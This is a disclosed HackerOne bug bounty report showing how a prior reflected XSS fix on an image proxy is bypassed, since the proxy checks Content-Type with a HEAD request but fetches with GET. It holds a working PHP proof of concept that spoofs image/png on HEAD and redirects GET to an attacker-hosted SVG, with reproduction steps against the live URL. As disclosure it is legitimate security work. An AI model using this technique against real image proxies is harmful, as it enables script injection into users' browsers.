# Bypass of #2035332 RXSS at image.hackerone.live via the `url` parameter

## Report Details
- **Report ID**: 2106708
- **URL**: https://hackerone.com/reports/2106708
- **State**: Closed
- **Severity**: low
- **Submitted**: 2023-08-11T17:18:01.849Z
- **Disclosed**: 2023-08-22T13:59:27.294Z

## Reporter
- **Username**: sudi
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: security

## Vulnerability Information
Heyy there,
I was able to bypass the fix for the reflected xss reported in #2035332

After the bug patch, the server now validates the `Content-Type` of the requested resource. The check is done by making a `HEAD` based request to the resource to get the `Content-Type` then if it corresponds to a valid image mime type a second request is made this time `GET` based to retrieve the page resource content.

Due to the HEAD based check it's very easy to bypass this check, just need to modify the server to response with a different `Content-Type` in case of GET and HEAD request

Example code:

```php
<?php

if ($_SERVER['REQUEST_METHOD'] == 'HEAD') {
    header("Content-Type: image/png");
    exit;
}

header("Location: https://sudistark.github.io/evilsvgfile.svg");

?>
```

TOCTOU ( time-of-check to time-of-use) : At the time of check the application relies  upon HEAD request but at the time of use relies upon GET request this allows the attacker to bypass the protection.


This xss works only in the Safari browser , I was able to find the problem why it doesn't works in other browser. It had do something with the `Accept` header.

Other browsers send the Accept header with these values: 

```
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
```
The server applies sanitization if the Accept header is similar to above, in case of Safari it does something wierd (I don;t actually have a mac so not sure what's eactly it's sending in the Accept header)
But the server doesn;t does any sanitization if the header value is like this

```
Accept: */*
```

---------------------------------


**Steps to reproduce:**

1.Save this code in your webserver xss.php

```php
<?php

if ($_SERVER['REQUEST_METHOD'] == 'HEAD') {
    header("Content-Type: image/png");
    exit;
}

header("Location: https://sudistark.github.io/evilsvgfile.svg");

?>
```
2.Then input your host in the url parameter: https://image.hackerone.live:8443/resource/md/get/url?url=http://yourhost/ss.php
3.Open this url in Safari browser and you should get the xss
{F2593672}


---------------------------------

## Impact

As the server is behind cloudflare I can;t directly make a request to the AWS metadata endpoint, but for the least I can confirm the xss with the provided poc

Thankyou
Regards
Sudhanshu

## Attachments
- image.png
